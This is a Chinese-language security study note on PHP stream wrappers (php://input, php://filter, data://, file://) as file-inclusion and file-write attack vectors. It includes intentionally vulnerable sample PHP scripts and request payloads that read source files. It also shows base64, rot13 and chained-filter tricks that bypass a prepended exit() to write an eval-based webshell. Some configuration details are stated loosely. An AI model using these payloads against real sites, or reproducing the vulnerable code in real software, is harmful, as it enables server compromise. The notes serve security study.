---
title: PHP伪协议
date: 2022-05-10 17:19:54
updated: 2022-05-10 17:19:54
categories: notebook
tags: PHP
urlname:
keywords: file,filter,input,stdin
---

## PHP伪协议

php中有很多封装协议，最常见的如file协议，php协议，data协议，zip和phar协议等等。

#### php://协议：

需要开启```allow_url_fopen```的：php://input、php://stdin、php://memory和php://temp

不需要开启```allow_wrl_fopen```的：php://filter

<!--more-->

##### php://input

*php://input*是php语言中一个只读的数据流；通过"php://input"，可以读取从Http客户端以POST方式提交、请求头“*Content-Type*”值非***"*multipart/form-data*"***的所有数据；"php://input"一般用来读取POST上来，除已被处理以外的剩余数据。

实例：

```php
<?php include($_GET['text']);?>
```

参数：

```?text=php://input```

```POSTDATA:phpinfo();```

##### php://filter协议

`php://filter`是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

resource=<要过滤的数据流>   这个参数是必须的。它指定了你要筛选过滤的数据流。
read=<读链的筛选列表>     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=<写链的筛选列表>   该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。

实例1：

test2.php

```php
<?php
$inputname = $_GET['inputname'];
$outputname = $_GET['outputname'];
$content = $_GET['content'];

echo file_get_contents($outputname);
file_put_contents($inputname,$content);
?>
```



```
# 明文写入:
?inputname=php://filter/resource=shell.php&content="helloworld!!"
# base64写入:
?inputname=php://filter/write=convert.base64-encode/resource=shell.php&content="Helloworld!!"

# 明文读取：
?outputname=php://filter/resource=shell.php
# base64解码duq
?outputname=php://filter/read=convert.base64-decode/resource=shell.php
```

可以用来读取文件源码

实例2：

php://filter协议的高级利用：

利用filter伪协议绕过死亡之die()，死亡之exit()

假设有代码：

```php
<?php
$content = $_POST['content'];
file_put_contents($_GET['filename'], "<?php exit; ?>".$content);
?>
```

代码允许我们写入文件，但在文件内容(content)前加了exit代码，这会导致我们写进去一句话后（如下图）也不能执行。

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510153430.png)

**方法（1）**

尝试利用filter伪协议+base64绕过：

先将一句话木马编码：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510113314.png)

##### Base64编码原理：

**（1）简单编码流程**

```text
1）将所有字符转化为ASCII码；

2）将ASCII码转化为8位二进制；

3）将8位二进制3个归成一组(不足3个在后边补0)共24位，再拆分成4组，每组6位；

4）将每组6位的二进制转为十进制；

5）从Base64编码表获取十进制对应的Base64编码；
```

**（2）base64解码过程**

base64解码，即是base64编码的逆过程，如果理解了编码过程，解码过程也就容易理解。将base64编码数据根据编码表分别索引到编码值，然后每4个编码值一组组成一个24位的数据流，解码为3个字符。对于末尾位“=”的base64数据，最终取得的4字节数据，需要去掉“=”再进行转换。

**（3）base64解码特点**

base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。如果要解码成功，输入的密文必须为4的倍数

通过base64解码来跳过exit语句中的特殊符号，剩下的部分为```phpexit```共7字节，我们需要让这7字节独立解码以至于不会影响到我们后面输入的一句话木马的解码，因此，我们需要在后面填充一个字节，让其变成4的倍数。构造的payload如下：

```content=xPD9waHAgZXZhbCgkX1BPU1RbJ2hhY2snXSk7Pz4=```

其中x为填充字符

构造数据包，发送请求：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510154012.png)

上传结果如下：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510154034.png)

除了base64绕过，还可以用rot13编码绕过：



**方法（2）**

除了使用**base64**编码绕过，我们还可以使用**rot13**编码绕过。相比**base64**编码，**rot13**的绕过死亡之exit更加方便，因为不用考虑前面添加的内容是否可以用**base64**解码，也不需要计算可**base64**解码的字符数量。

rot13编码原理：

将当前字母变换为13个位置之后的字母，如a->n,b->o

```<?php exit; ?> ``` ->  ```<?cuc rkvg; ?>```，编码后边不会影响一句话木马的执行

构造数据包：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510155641.png)

上传结果如下：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510155706.png)

虽然**rot13**更加的方便，但是还是有缺点，就是当服务器开启了短标签解析，一句话木马即使写入了，也不会被PHP解析。



**方法（3）**

php://filter还支持多种过滤器一起使用

构造payload

```?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php```

```content=PD9waHAgZXZhbCgkX1BPU1RbJ2hhY2snXSk7Pz4=```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510160623.png)

strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。





#### data://

自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到`base64编码`传输

实例：

```
<?php
$file = $_GET['text'];
$content = file_get_contents($file,'r');
echo $content;
?>
```

```?text=data://text/plain;base64,SGVsbG8gV29ybGQhIQ==```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510163631.png)

可以用来控制file_get_contents()的返回值





#### file://协议

**条件：**

* allow_url_fope:off/on
* allow_url_include:off/on

file协议用于访问本地文件系统，且不收allow_url_fopen和allow_url_incldue的限制

**用法：**

```
/path/to/file.ext
relative/path/to/file.ext
fileInCwd.ext
C:/path/to/winfile.ext
C:\path\to\winfile.ext
\\smbserver\share\path\to\winfile.ext
file:///path/to/file.ext
```

实例：

test.php

```php
<?php
$file = $_GET['file'];
echo include($file);
?>
```

访问：

```http://127.0.0.1/test_php/test.php?file=file://E:\phpstudy_pro\WWW\hello.txt```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220510110432.png)